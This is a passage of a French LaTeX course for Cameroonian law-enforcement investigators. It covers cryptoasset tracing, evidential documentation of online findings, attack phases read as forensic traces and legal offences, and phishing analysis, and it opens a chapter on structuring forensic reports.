\begin{longtable}{p{0.30\linewidth}p{0.66\linewidth}}
\rowcolor{TableauEntete}\textcolor{white}{\bfseries Notion} & \textcolor{white}{\bfseries Ce qu'il faut retenir} \\ \hline
Adresse & Chaîne de caractères recevant et envoyant des fonds ; ce n'est pas une identité. \\
Transaction & Transfert horodaté entre adresses, avec les montants. \\
Regroupement & Des adresses utilisées ensemble appartiennent souvent à un même portefeuille ; le regroupement est une hypothèse à corroborer. \\
Plateforme d'échange & Service qui convertit des cryptoactifs en monnaie ; soumis, selon l'État, à des obligations d'identification de ses clients. \\
\end{longtable}

Depuis l'adresse connue, suivre les transactions sortantes jusqu'à une adresse contrôlée par une plateforme d'échange : c'est le point où les fonds entrent dans un service qui connaît, en principe, l'identité de son client. La consultation de la chaîne s'arrête là ; l'identité du client s'obtient auprès de la plateforme par réquisition, ou par entraide lorsqu'elle est établie à l'étranger (Ch. 10, UE SEC4031).

\begin{boxalert}
Une adresse de portefeuille n'est pas une identité. Les fonds peuvent passer par de nombreuses adresses, par des services qui mêlent les transactions pour brouiller le suivi, ou par plusieurs plateformes. Le traçage établit un chemin de fonds entre des adresses ; il ne nomme personne. Le nom vient de la plateforme, sur réquisition ou entraide.
\end{boxalert}

\subsection{Le point de bascule vers l'acte d'enquête}

\begin{longtable}{p{0.40\linewidth}p{0.56\linewidth}}
\rowcolor{TableauEntete}\textcolor{white}{\bfseries Ce que fait la source ouverte} & \textcolor{white}{\bfseries Ce qui exige un acte} \\ \hline
Établir le chemin des fonds entre adresses & Obtenir l'identité du client d'une plateforme \\
Identifier la plateforme réceptrice & Obtenir les journaux de connexion de ce client \\
Dater les transferts & Faire geler ou saisir des avoirs \\
\end{longtable}

Le traçage prépare la demande : il dit à quelle plateforme s'adresser, pour quelle adresse et pour quelle période. La demande elle-même suit le régime des réquisitions et de l'entraide (Ch. 10 et 12, UE SEC4031).

\begin{boxCRO}
\textbf{Analyse CRO · Traçage blockchain}
\textbf{C} : les transactions blockchain sont publiques et pseudonymes. L'analyse ne révèle pas d'identité. L'atteinte à la confidentialité est nulle tant qu'on ne croise pas avec des données KYC.

\textbf{R} : l'immuabilité de la blockchain confère une fiabilité maximale. La corrélation avec des sources tierces (KYC, logs d'exchange) élève la fiabilité de l'identification.

\textbf{O} : l'analyse blockchain est reproductible et vérifiable indépendamment. Elle constitue une preuve d'opposabilité exceptionnelle, sous réserve de l'attribution (identification du détenteur du wallet).

\textbf{Impact CRO} : \texttt{C: → pseudonyme \quad R: ↑↑↑ immuabilité \quad O: ↑↑↑ reproductibilité}
\end{boxCRO}

\begin{boxexo}
\textbf{Exercice~:Tracer et cartographier}
Sur un jeu de données de formation :
\begin{enumerate}
\item suivez, sur l'explorateur, le flux depuis l'adresse initiale et relevez chaque transaction (date, montant, adresse) ;
\item identifiez la plateforme réceptrice et le montant parvenu jusqu'à elle ;
\item dressez la carte des liens du dossier, en distinguant les liens établis des liens probables ;
\item rédigez la demande à adresser à la plateforme réceptrice : adresse concernée, période, informations demandées et voie de transmission selon l'État où la plateforme est établie.
\end{enumerate}
\end{boxexo}

\begin{boxresume}
\begin{itemize}
\item La carte des liens synthétise l'enquête ; chaque lien porte sa source et son degré de certitude.
\item Les chaînes de blocs publiques se lisent librement ; suivre un flux jusqu'à une plateforme.
\item Une adresse n'est pas une personne ; l'identité vient de la plateforme, sur réquisition ou entraide.
\item Le traçage prépare la demande ; il ne la remplace pas.
\end{itemize}
\end{boxresume}

\section{Documentation et valeur probante des constatations en ligne}

\subsection{Pourquoi documenter}

Une page en ligne change ou disparaît. Le compte se ferme, la publication s'efface, le site frauduleux est retiré. Une constatation non documentée ne prouve plus rien à l'audience. Documenter, c'est fixer un état daté du contenu, en démontrant qu'il n'a pas été modifié depuis, et dire comment il a été obtenu.

\subsection{Capturer}

\begin{longtable}{p{0.30\linewidth}p{0.66\linewidth}}
\rowcolor{TableauEntete}\textcolor{white}{\bfseries Élément à capturer} & \textcolor{white}{\bfseries Précision} \\ \hline
L'adresse exacte & L'adresse complète de la page, visible sur la capture. \\
Le contenu visible & Capture d'écran de la page entière ; à défaut, plusieurs captures qui se recouvrent. \\
La date et l'heure & Horloge visible ou mention au procès-verbal, avec le fuseau (UTC+1). \\
Le contenu tel qu'il est servi & Enregistrement de la page (et, pour un site, de ses éléments) afin de conserver l'adresse des liens et les éléments non affichés. \\
Le contexte & Le chemin suivi pour arriver à la page, la requête employée, l'outil utilisé et sa version. \\
\end{longtable}

Enregistrer la page telle qu'elle est servie conserve des éléments invisibles à l'écran (adresses des liens, adresse de destination d'un formulaire) qui, dans le cas d'un site frauduleux, désignent parfois le point de collecte des données. L'enregistrement se fait sur le poste du laboratoire, jamais en se connectant au système visé.

\subsection{Figer par l'empreinte}

Chaque fichier enregistré (capture, page, image) reçoit une empreinte numérique (SHA-256), calculée au moment de l'enregistrement et inscrite au procès-verbal. Recalculée plus tard, elle démontre que le fichier produit à l'audience est celui qui a été constaté.

\subsection{Le procès-verbal de constatation en source ouverte}

\begin{boxcustody}
\textbf{Constatation en source ouverte}
Conformément aux articles 52-59 de la Loi 2010/012 et au standard ISO/IEC 27037~\cite{iso27037} (Ch. 8, UE SEC4031), la constatation en source ouverte doit documenter :

\begin{enumerate}
\item \textbf{Numéro de dossier et numéro d'evidence} (ex. : DOS-2026-XXX / EV-OSINT-001) ;
\item \textbf{Description de la source} : URL complète, titre de la page, date et heure de consultation ;
\item \textbf{Identification de l'agent} : nom, grade, matricule ;
\item \textbf{Outils utilisés} : navigateur, version, outils d'enregistrement, version ;
\item \textbf{Empreintes cryptographiques} : SHA-256 de chaque fichier enregistré ;
\item \textbf{Environnement} : poste du laboratoire (jamais un poste de service connecté au réseau de production) ;
\item \textbf{Signature} de l'agent et date de clôture.
\end{enumerate}
\end{boxcustody}

Le procès-verbal rapporte les opérations comme tout procès-verbal : qualité de l'agent, cadre de l'enquête, date, heure et fuseau, poste et outils utilisés avec leurs versions. Il ajoute, pour chaque constatation : l'adresse consultée, le chemin suivi, la description du contenu, les fichiers enregistrés et leurs empreintes, jointes en annexe.

\begin{boxalert}
La documentation d'un site frauduleux se fait par consultation et enregistrement, jamais en se connectant à l'espace d'administration du site ni en soumettant de vraies données à son formulaire. Se connecter serait un accès non autorisé \textbf{[art. 65 (2) Loi 2010/012]} ; soumettre des données fausserait la preuve. On constate ce que le public voit.
\end{boxalert}

\subsection{Du relevé au rapport}

Le rapport OSINT reprend la structure d'un rapport technique (Ch. 20) : questions, méthode, constatations sourcées et numérotées, analyse, limites, conclusions graduées. Chaque affirmation renvoie à une constatation, chaque constatation à une capture et à son empreinte. Les conclusions distinguent l'établi du probable et exposent ce que la source ouverte ne peut pas dire.

\begin{boxexo}
\textbf{Exercice~:Dresser un procès-verbal de constatation}
À partir de pages fictives préparées pour l'exercice :
\begin{enumerate}
\item capturez et enregistrez chaque page, calculez son empreinte ;
\item rédigez le procès-verbal de constatation ;
\item indiquez, pour un site imitant une banque, ce que le code de la page révèle et comment vous le constatez sans soumettre de données ;
\item relevez ce que ces constatations prouvent et ce qu'elles ne prouvent pas.
\end{enumerate}
\end{boxexo}

\begin{boxresume}
\begin{itemize}
\item Capturer l'adresse, le contenu, la date, la page telle que servie et le contexte.
\item Empreinte de chaque fichier, inscrite au procès-verbal.
\item Procès-verbal de constatation : mêmes exigences que tout procès-verbal, plus les fichiers et leurs empreintes.
\item Constater ce que le public voit ; ne jamais se connecter ni soumettre de données.
\item Aligner la documentation sur la chaîne de custody (Ch. 8, UE SEC4031).
\end{itemize}
\end{boxresume}

\section{Comprendre une attaque pour l'investiguer}

\subsection{Une grille de lecture, pas un mode d'emploi}

L'enquêteur n'attaque pas ; il reconstitue. Pour reconstituer, il lui faut une grille qui ordonne les faits. Les modèles de description d'attaque (par exemple la \emph{Kill Chain} de Lockheed Martin déjà mobilisée au Chapitre 3 de l'UE SEC4031 pour l'affaire MVOM) découpent une intrusion en phases successives. Leur intérêt, ici, n'est pas d'apprendre à conduire ces phases mais de \textbf{savoir, pour chacune, quelle trace chercher et quel texte appliquer}.

\subsection{Phases, traces et qualification}

\begin{longtable}{p{0.20\linewidth}p{0.38\linewidth}p{0.38\linewidth}}
\rowcolor{TableauEntete}\textcolor{white}{\bfseries Phase} & \textcolor{white}{\bfseries Traces à rechercher} & \textcolor{white}{\bfseries Qualification possible} \\ \hline
\textbf{Reconnaissance} : collecte d'informations, repérage des services exposés & Journaux du pare-feu et des serveurs ; balayages répétés d'adresses ou de ports & En principe non punissable si limitée à la consultation ; l'accès qui suit ne l'est pas \\
\textbf{Préparation et livraison} : constitution puis envoi de l'outil (courriel piégé, lien, support) & Courriel dans la boîte de réception et ses en-têtes ; journaux du serveur de messagerie ; support connecté relevé dans le registre & Tentative selon l'acte accompli \textbf{[art. 94 CP]} ; escroquerie si la victime est trompée \textbf{[art. 318 CP]} \\
\textbf{Accès} : entrée dans le système, avec ou sans franchissement d'une mesure de sécurité & Journaux d'authentification et d'événements ; processus et connexions en mémoire vive & Accès sans droit \textbf{[art. 65 (2)]} ; accès en violation des mesures de sécurité pour obtenir des informations \textbf{[art. 69]} \\
\textbf{Installation et maintien} : mise en place d'un accès durable & Entrées de démarrage automatique ; nouveau service ; tâche planifiée & Maintien frauduleux \textbf{[art. 68]} ; introduction de données pour perturber \textbf{[art. 71]} \\
\textbf{Pilotage à distance} : le système contacte l'infrastructure de l'attaquant & Connexions sortantes en mémoire ; requêtes de résolution vers des domaines inhabituels ; journaux réseau & Atteinte à l'intégrité ou au fonctionnement \textbf{[art. 66 à 68]} \\
\textbf{Actions finales} : vol de données, chiffrement contre rançon, sabotage & Fichiers exfiltrés ou chiffrés ; journaux de suppression ; note de rançon & Atteinte à la vie privée et aux données \textbf{[art. 74]} ; chantage \textbf{[art. 303 CP]} ; extorsion ; escroquerie ; atteinte à l'intégrité des données \textbf{[art. 71 et 72]} \\
\end{longtable}

L'enquêteur découvre souvent d'abord les effets (données chiffrées, fonds partis) et remonte vers l'origine. La grille se lit alors de bas en haut : partir de l'action finale constatée, chercher la trace de pilotage, puis d'installation, d'accès, de livraison, jusqu'à la reconnaissance. Chaque remontée se corrobore par une trace indépendante (Ch. 14 et 15).

\subsection{Du récit à la preuve}

Un rapport d'attaque, qu'il émane de la victime ou d'un prestataire, raconte une histoire. L'enquête ne retient de ce récit que ce que les traces confirment. Trois précautions :

\begin{enumerate}
\item \textbf{Ne pas prendre le vocabulaire pour un fait.} « Le pirate a pris le contrôle du serveur » est une conclusion ; le fait est une trace d'accès à telle heure, depuis telle adresse.
\item \textbf{Distinguer l'auteur du point d'origine.} Une adresse d'origine désigne un point du réseau, non une personne.
\item \textbf{Rattacher chaque phase à un texte.} La qualification se construit phase par phase, chacune appuyée sur sa preuve, comme au Chapitre 12 de l'UE SEC4031.
\end{enumerate}

\begin{boxalert}
La tentation, pour « comprendre », de rejouer l'attaque sur le système de la victime ou sur un système réel est une faute : c'est un accès non autorisé \textbf{[art. 65]} et une contamination de la preuve. La compréhension passe par les traces et, si un essai technique est nécessaire, par le laboratoire isolé sur des cibles autorisées, jamais sur le système en cause.
\end{boxalert}

\subsection{Le cas du rançongiciel}

Le rançongiciel réunit plusieurs phases : accès, installation, chiffrement des données, demande de rançon, parfois exfiltration préalable et menace de publication. Pour l'enquêteur, il se lit comme un cumul de qualifications : atteinte à l'intégrité et au fonctionnement du système \textbf{[art. 66 à 68]}, atteinte aux données \textbf{[art. 71]}, chantage \textbf{[art. 303 CP]}, atteinte à la vie privée en cas de publication de données personnelles \textbf{[art. 74]}. La conduite à tenir (préservation des journaux, note de rançon remise sous empreinte, déconseiller le paiement et toute riposte) relève du Chapitre 8 de l'UE SEC4031 et du Chapitre 20.

\begin{boxCRO}
\textbf{Analyse CRO · Reconstitution d'attaque}
\textbf{C} : la reconstitution d'attaque implique l'accès à des données sensibles de la victime (journaux, fichiers, mémoire). La proportionnalité et la minimisation (art. 9-11 Loi 2024/017) limitent la collecte au périmètre nécessaire.

\textbf{R} : la reconstruction repose sur la convergence de traces multi-sources (journaux, mémoire, réseau). La redondance forensique (Ch. 14) garantit qu'un artefact survivant suffit à établir un fait.

\textbf{O} : la chronologie reconstituée, appuyée sur des traces horodatées et documentées, est opposable. La distinction constatation/analyse (NIST SP 800-86) structure le rapport.

\textbf{Impact CRO} : \texttt{C: ↓ proportionnalité \quad R: ↑↑ convergence \quad O: ↑↑ documentation}
\end{boxCRO}

\begin{boxexo}
\textbf{Exercice~:Lire une attaque par ses traces}
À partir d'un ensemble de pièces (courriel, journaux de connexion, note de rançon) :
\begin{enumerate}
\item placez chaque fait connu dans la grille des phases (phase, trace, qualification) ;
\item distinguez, pour chaque phase, ce qui est établi par une trace de ce qui reste à établir ;
\item dressez la chronologie de l'atteinte, du courriel initial au virement ;
\item proposez la qualification des faits, phase par phase, en citant les textes et indiquez les réquisitions et demandes d'entraide nécessaires.
\end{enumerate}
\end{boxexo}

\begin{boxresume}
\begin{itemize}
\item Les phases d'une attaque sont une grille de lecture : à chaque phase, une trace et un texte.
\item On remonte souvent des effets vers l'origine ; chaque remontée se corrobore.
\item Le vocabulaire d'un rapport n'est pas un fait ; l'adresse d'origine n'est pas une personne.
\item On ne rejoue jamais une attaque sur le système en cause ni sur un système réel.
\end{itemize}
\end{boxresume}

\section{Courriels et sites frauduleux}

\subsection{Analyser un courriel frauduleux}

Un courriel porte des en-têtes qui tracent son chemin, de l'expéditeur au destinataire. Ils sont la première source pour en apprécier l'origine réelle.

\begin{longtable}{p{0.26\linewidth}p{0.70\linewidth}}
\rowcolor{TableauEntete}\textcolor{white}{\bfseries En-tête} & \textcolor{white}{\bfseries Lecture} \\ \hline
Expéditeur affiché & Facile à falsifier ; comparer au domaine réel de l'organisation prétendue. \\
Adresse de réponse & Souvent différente de l'expéditeur dans un courriel frauduleux ; c'est vers elle que part la réponse de la victime. \\
Chemin de transit & Se lit de bas en haut ; la première mention correspond au serveur d'émission. \\
Identifiant du message & Le domaine qu'il contient révèle parfois le serveur d'émission réel. \\
Mécanismes d'authentification & Un échec des vérifications de conformité est un fort indice d'usurpation de l'expéditeur. \\
\end{longtable}

L'analyse des en-têtes donne une adresse ou un domaine d'émission. Elle ne nomme pas l'auteur : l'identification passe par une réquisition au fournisseur de messagerie ou par l'entraide (Ch. 10, UE SEC4031). Le courriel d'origine est conservé sous sa forme brute (avec ses en-têtes) et son empreinte, non recopié dans le corps du procès-verbal seul.

\begin{boxalert}
On n'ouvre pas le lien d'un courriel frauduleux sur un poste de service, on ne soumet pas de données à son formulaire, on ne répond pas à son adresse de réponse. Ces gestes alertent l'auteur, exposent le poste et faussent la preuve. L'examen se fait sur les en-têtes et, pour le site, par la consultation documentée décrite à la section précédente, sur le poste du laboratoire.
\end{boxalert}

\subsection{Caractériser un site qui recueille des identifiants}

Pour la qualification, l'élément déterminant est \textbf{la destination des données saisies} : le formulaire envoie ce que la victime tape vers une adresse contrôlée par l'auteur. Cette destination, relevée dans le code de la page servie sans qu'aucune donnée n'ait été soumise, relie le site à une infrastructure et fonde les demandes de conservation et d'entraide.

\subsection{Le laboratoire isolé et le rapport d'expert}

Comprendre concrètement une technique suppose parfois de l'observer. Cela se fait dans le \textbf{laboratoire isolé} : des machines virtuelles sans aucune connexion vers l'extérieur, sur des cibles prévues pour l'exercice. Deux règles encadrent tout essai technique.

\begin{boxalert}
Un test qui touche un système réel, sans le consentement de la personne autorisée à en disposer, est une infraction \textbf{[art. 65 Loi 2010/012]}, que le mobile soit la curiosité, la formation ou l'enquête. Un essai n'est licite que sur un système explicitement autorisé, à savoir, en formation, les cibles du laboratoire isolé. Les participants qui useraient de ces techniques hors de ce cadre s'exposent aux peines mêmes qu'ils sont formés à poursuivre.
\end{boxalert}

Dans une affaire réelle, l'analyse technique d'une intrusion est confiée à une personne qualifiée ou à un expert, requis par l'autorité compétente \textbf{[art. 92 (2) CPP ; art. 55 et 56 Loi 2010/012]}. Le rôle de l'enquêteur est de \textbf{lire et de discuter} ce rapport, en appliquant la distinction \emph{Examination / Analysis} du NIST SP 800-86 (Ch. 7 de l'UE SEC4031 et Ch. 20) :

\begin{itemize}
\item \textbf{Éléments examinés} : le rapport porte-t-il sur les copies scellées, avec leurs empreintes ?
\item \textbf{Méthode} : outils et versions, environnement d'analyse ; l'analyse est-elle reproductible (principe de reproductibilité, prologue de l'UE SEC4031) ?
\item \textbf{Constatations et conclusions} : distingue-t-il le fait constaté de l'interprétation ? Les conclusions sont-elles graduées (niveau de confiance explicite) ?
\item \textbf{Limites} : dit-il ce qu'il n'a pas pu établir ?
\item \textbf{Traduction procédurale} : chaque conclusion technique se rattache-t-elle à une phase et à un texte ?
\end{itemize}

\section{Synthèse et exercice intégrateur}

\subsection{Scénario opérationnel · Opération BAOBAB 2}

\begin{boxscenario}{Opération BAOBAB 2 · Dossier de synthèse}
Une page de placement en cryptoactifs (« Baobab Invest ») a détourné 47 millions de francs CFA. La page a disparu, les fonds ont transité vers une plateforme d'échange. Trois éléments nouveaux sont versés au dossier :
\begin{itemize}
\item une adresse de portefeuille Bitcoin, communiquée par la plateforme d'échange ;
\item un pseudonyme, utilisé par l'administrateur de la page sur une messagerie et un réseau social ;
\item le signalement, par une banque de la place, d'un site qui imite sa page de connexion et a servi à recueillir des identifiants avant les versements.
\end{itemize}

L'enquête mobilise l'ensemble des techniques de ce chapitre : recherche sur le pseudonyme, cartographie des liens, analyse des domaines, traçage des cryptoactifs, analyse du courriel frauduleux, lecture de l'attaque par ses traces, documentation des constatations.
\end{boxscenario}

\subsection{Exercice intégrateur}

\begin{boxexo}
\textbf{Exercice~:Dossier de synthèse}
À partir d'un ensemble de pièces (instructions du Procureur, éléments transmis, constatations en source ouverte, traçage du portefeuille, note de la banque) :

\begin{enumerate}
\item Établissez le dossier OSINT : constatations sourcées et datées sur le pseudonyme, l'administrateur présumé, les domaines et le site imitant la banque ; carte des liens ; traçage des cryptoactifs jusqu'à la plateforme réceptrice.
\item Analysez le courriel frauduleux et le site de collecte ; caractérisez la destination des données.
\item Placez les faits dans la grille des phases et proposez la qualification, texte par texte.
\item Dressez la liste ordonnée des actes à venir : réquisitions au Cameroun, demandes de conservation et d'entraide à l'étranger, en désignant pour chacun le destinataire, l'État et le canal.
\item Rédigez la note de synthèse au Procureur, en distinguant l'établi du probable et en exposant les limites.
\end{enumerate}

\textbf{Barème indicatif} : qualité et traçabilité des sources ; recoupement et cartographie ; traçage des cryptoactifs et point d'entraide ; qualification des faits ; valeur probante de la documentation.
\end{boxexo}

% --- Encadré lab NDAP SUKULU ---
\begin{boiteRemarque}{Notions mobilisées par le laboratoire INA-LAB-07}
\begin{itemize}
    \item \textbf{Faux domaine}~: on le compare au domaine déclaré par la
          marque~; la date de création (\texttt{Creation Date} du WHOIS)
          rapportée à la date de signalement mesure la préparation.
    \item \textbf{DNS passif}~: l'historique des résolutions montre qu'un
          domaine frauduleux et un autre domaine partagent une même adresse
          IP~: c'est un lien d'infrastructure.
    \item \textbf{Certificats}~: un certificat peut couvrir plusieurs noms
          (champ des \emph{noms alternatifs du sujet}, SAN)~; un même
          certificat qui couvre deux domaines relie leurs titulaires.
    \item \textbf{Profils}~: un pseudonyme seul trompe~; la même photo
          (recherche d'image inversée, empreinte de l'image) relie des
          comptes. L'identité se confirme ensuite par réquisition.
    \item \textbf{Cryptoactifs}~: les entrées d'une adresse se somment
          dans un explorateur public~; les sorties vers une adresse
          \emph{étiquetée} comme plateforme d'échange marquent le point de
          bascule vers la réquisition ou l'entraide.
\end{itemize}
\end{boiteRemarque}

\section{À retenir}

\begin{boxresume}
Ce qu'il faut retenir de ce chapitre :

\begin{itemize}
\item \textbf{Frontière consultation / accès} : on consulte ce qui est public, on n'accède pas à ce qui est protégé \textbf{[art. 65 et 69 Loi 2010/012]}. Toute recherche en sources ouvertes est un acte d'enquête documenté.

\item \textbf{Cycle du renseignement} : planification, collecte, traitement, analyse, diffusion. Chaque étape est documentée ; chaque constatation est sourcée et horodatée.

\item \textbf{Personnes et organisations} : nom, adresse, numéro, pseudonyme et image sont des points de départ à recouper ; l'identité se confirme par réquisition.

\item \textbf{Infrastructures} : la date de création d'un domaine est un indice fort ; le pays d'une adresse oriente l'entraide sans localiser la personne ; un site imitant une marque se capture d'abord.

\item \textbf{Cryptoactifs} : les chaînes de blocs publiques se lisent librement ; suivre un flux jusqu'à une plateforme d'échange ; l'identité vient de la plateforme, sur réquisition ou entraide.

\item \textbf{Documentation et valeur probante} : capture, empreinte SHA-256, procès-verbal de constatation aligné sur la chaîne de custody (Ch. 8, UE SEC4031). Sans documentation, la constatation est irrecevable.

\item \textbf{Compréhension d'une attaque} : à chaque phase (reconnaissance, livraison, accès, installation, pilotage, actions finales), une trace et un texte. Remonter des effets vers l'origine ; corroborer chaque remontée.

\item \textbf{Courriels et sites frauduleux} : analyse par les en-têtes ; caractérisation d'un site par la destination des données saisies ; jamais de clic ni de soumission de données.

\item \textbf{Rapport d'expert} : le lire, le discuter et le traduire en qualifications selon la distinction \textit{Examination / Analysis} (NIST SP 800-86).

\item \textbf{Trilemme CRO} : chaque technique de ce chapitre s'analyse selon Confidentialité (C), Fiabilité (R) et Opposabilité (O). La documentation est le levier principal d'opposabilité ; la proportionnalité est le garde-fou de confidentialité.
\end{itemize}
\end{boxresume}
        % ============================================================================
% Fichier  : partie4/P04_C20_rapport_forensique.tex
% Titre    : Rédaction du Rapport Forensique
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% ============================================================================

\chapter{Rédaction du Rapport Forensique}
\label{chap:rapport}

\epigraph{%
    « Un rapport forensique qui ne résiste pas à un contre-interrogatoire
    ne vaut pas mieux qu'une analyse technique jamais documentée. »%
}{Principe de la défendabilité forensique}

\niveauChapitre{Intermédiaire}{%
    Chapitres~8~(UE~SEC4031) (admissibilité) et
    7~(UE~SEC4031) (distinction constatation/analyse)
    indispensables. Ce chapitre synthétise toute la Partie~IV
    en document juridiquement opposable.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Maîtriser l'architecture en trois niveaux du rapport
          forensique~: synthèse exécutive, rapport technique,
          dossier probatoire.
    \item Appliquer rigoureusement la distinction entre
          \termecle{Constatations} (faits vérifiables) et
          \termecle{Analyse} (interprétations avec niveau de
          confiance).
    \item Structurer chaque section selon les exigences
          d'admissibilité du droit camerounais et les standards
          forensiques internationaux (NIST~SP~800-86~\cite{nist80086}).
    \item Rédiger une synthèse exécutive lisible par un magistrat
          sans formation technique.
    \item Anticiper les attaques en contre-interrogatoire et
          structurer les réponses dans le rapport lui-même.
    \item Produire un rapport complet sur le cas MVOM en appliquant
          l'intégralité des techniques présentées dans ce cours.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Pourquoi le rapport est le vrai livrable du cours}
% ============================================================================

Toute l'investigation technique des Chapitres~\ref{chap:for-sys}
à~\ref{chap:for-iot} ne produit qu'une chose visible pour le tribunal~:
le rapport forensique. Une analyse brillante mal documentée ne vaut
rien. Un rapport solide sur une analyse modeste peut convain­cre un juge.

Le rapport forensique est le seul contact direct entre votre travail
et la décision judiciaire. C'est aussi le document qui sera scruté
mot à mot par l'avocat de la défense. Ce chapitre traite donc la
rédaction non comme une formalité administrative mais comme
une compétence technique à part entière.

\separateur

% ============================================================================
\section{Architecture en Trois Niveaux}
\label{sec:architecture-rapport}
% ============================================================================

Conformément aux principes du PIU (Ch.~6~(UE~SEC4031), étape~E12) et
aux standards NIST~SP~800-86, le rapport forensique complet comprend
trois niveaux de profondeur correspondant à trois audiences distinctes.

\begin{tableaucours}{p{3.0cm}p{3.5cm}p{5.0cm}}{%
    \tableauHeader{Niveau} &
    \tableauHeader{Audience} &
    \tableauHeader{Contenu et longueur indicative}
}
\textbf{Niveau~1}. Synthèse Exécutive &
    Magistrat, partie civile, direction &
    2--4~pages. Pas de technique. Conclusions, qualifications, preuves
    clés, recommandations. Compréhensible par un non-technicien. \\
\textbf{Niveau~2}. Rapport Technique &
    Magistrat, avocat, expert adverse &
    20--100~pages. Méthodologie, constatations horodatées, analyse.
    Chaque affirmation référencée à une preuve. \\
\textbf{Niveau~3}. Dossier Probatoire &
    Expert adverse, tribunal &
    Annexes~: images E01, logs bruts, captures d'écran, formulaires
    de custody. Référencés depuis le Niveau~2. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~20.1. Architecture en trois niveaux du rapport forensique}\end{center}

\begin{boiteRemarque}{Rédiger pour le bon destinataire}
Le Niveau~1 est rédigé pour une personne qui ne sait pas ce qu'est
un hash SHA-256. Le Niveau~2 est rédigé pour un technicien
ou un avocat compétent qui \emph{voudra} comprendre la méthode.
Le Niveau~3 est rédigé pour un expert qui \emph{voudra vérifier}
chaque affirmation. Ces trois documents doivent être cohérents~:
la même conclusion doit apparaître dans les trois niveaux, à des
niveaux de détail différents.
\end{boiteRemarque}

% ============================================================================
\section{Règle Fondamentale~: Constatation vs Analyse}
\label{sec:constatation-analyse}
% ============================================================================

La distinction entre \textbf{Constatation} et \textbf{Analyse} est
la règle la plus importante de la rédaction forensique. Issue de
NIST~SP~800-86 (Ch.~7~(UE~SEC4031)), elle protège l'expert
des attaques méthodologiques les plus fréquentes.

\begin{boxdef}
\textbf{Constatation}~: énoncé factuel, objectif, vérifiable
indépendamment par tout technicien utilisant les mêmes outils
sur les mêmes données. Doit pouvoir être confirmé ou infirmé
sans ambiguïté. N'inclut aucune inférence.

\textbf{Analyse}~: interprétation des constatations dans leur
contexte. Comprend obligatoirement~: un niveau de confiance explicite
(élevé / modéré / faible) et les hypothèses alternatives envisagées
et réfutées (E9bis PIU).
\end{boxdef}

\begin{tableaucours}{p{5.5cm}p{5.5cm}}{%
    \tableauHeader{Constatation (correct)} &
    \tableauHeader{Mélange interdit (à éviter)}
}
« Le fichier \texttt{enc\_all.ps1} est présent dans
\texttt{\%TEMP\%} avec un horodatage de création du
13/03/2026~à~02h16:50 selon le \texttt{\$UsnJrnl}. » &
« Le fichier \texttt{enc\_all.ps1} a été placé par l'attaquant
dans \texttt{\%TEMP\%}. » (mélange fait + interprétation) \\
« Le journal Prefetch enregistre une exécution de
\texttt{enc\_all.ps1} à 02h17:44, avec un compteur
d'exécution de~1. » &
« L'attaquant a exécuté le ransomware à 02h17. »
(l'identité de l'attaquant n'est pas dans le Prefetch) \\
« Le \texttt{\$UsnJrnl} enregistre la modification de
847~fichiers \texttt{.docx} entre 02h18:31 et 02h19:02. » &
« L'attaquant a chiffré 847~fichiers en 31~secondes. »
(``chiffré'' est une interprétation~; ``modifié'' est le fait) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~20.2. Exemples constatation vs mélange interdit}\end{center}

\begin{boxalert}
\textbf{La règle pratique~: le test du ``mais si''}

Avant d'écrire une phrase dans la section Constatations, posez-vous~:
``Mais si je me trompe sur l'interprétation, la phrase est-elle
encore vraie~?''

``\textit{Le fichier enc\_all.ps1 est présent dans \%TEMP\%}''
$\to$ vrai indépendamment de toute interprétation. \textbf{Constatation.}

``\textit{L'attaquant a déposé enc\_all.ps1 dans \%TEMP\%}''
$\to$ suppose que l'auteur du dépôt est identifié. Si l'identification
échoue, la phrase est fausse. \textbf{Analyse, pas constatation.}
\end{boxalert}

% ============================================================================
\section{Structure Détaillée du Rapport Technique (Niveau~2)}
\label{sec:structure-rapport}
% ============================================================================

\subsection{Page de garde et informations administratives}

\begin{lstlisting}[language=bash_forensique,
    caption={Métadonnées obligatoires -- page de garde}]
RAPPORT D'EXPERTISE FORENSIQUE NUMERIQUE
=========================================

Numero de dossier    : DOS-2026-034
Numero de rapport    : REP-DOS-2026-034-v1.0
Date de redaction    : 20 mars 2026
Affaire              : Opération MVOM -- ransomware TRANSBOIS SA

EXPERT :
Nom                  : [Nom Prénom]
Titre/Grade          : OPJ / Expert judiciaire agrée [si applicable]
Matricule            : PNC XXXX-X
Organisme            : DCPJ Douala
Contact              : [email officiel]  [telephone]

COMMETTANT :
Autorité mandante    : Parquet du TGI de Douala
Référence judiciaire : [Numéro de réquisition / ordonnance]
Date de la mission   : 13 mars 2026

EVIDENCE(S) ANALYSEE(S) :
EV-001 : Dell Inspiron 15 SN-GF8T3Y2 (image E01)
         Hash MD5 : a3f7b29c8e1d4f56a2c8b7e3d9f0a142
         Hash SHA-256 : 3d9c8f2b7e4a1c6d5f8e2b9a...
EV-001bis : Dump RAM 16 Go (MBONGO_RAM_20260315.mem)
         Hash SHA-256 : 4e8f3a1b2c9d7e5f6a0b1c2d...

VERSION : v1.0 -- rapport initial
          [v2.0 si rapport complémentaire requis]
\end{lstlisting}

\subsection{Section~1~: Contexte et Mission}

\begin{lstlisting}[language=bash_forensique,
    caption={Section Contexte et Mission -- exemple MVOM}]
1. CONTEXTE ET MISSION
======================

1.1 Contexte factuel
Le 13 mars 2026, TRANSBOIS SA (société d'exploitation forestière,
Douala) a signalé une attaque ransomware ayant paralysé son système
informatique. 847 fichiers de travail ont été rendus inaccessibles.

1.2 Mission
Conformément à la réquisition judiciaire N° [XXX] du Parquet du TGI
de Douala en date du 13 mars 2026, l'expert soussigné a été mandaté
pour :
  (a) Établir les faits techniques liés à l'incident du 13 mars 2026 ;
  (b) Identifier, si possible, l'origine de l'attaque ;
  (c) Évaluer l'étendue des dommages.

1.3 Périmètre et limitations
L'analyse porte exclusivement sur l'evidence EV-001 (image E01 du
serveur compromis) et EV-001bis (dump RAM).
Limitation : la capture réseau contemporaine à l'incident n'était
pas disponible. Les logs de pare-feu MTN pour la période ont été
requis séparément (réquisition N° [YYY] du 14 mars 2026 ; réponse
attendue).
\end{lstlisting}

\subsection{Section~2~: Méthodologie}

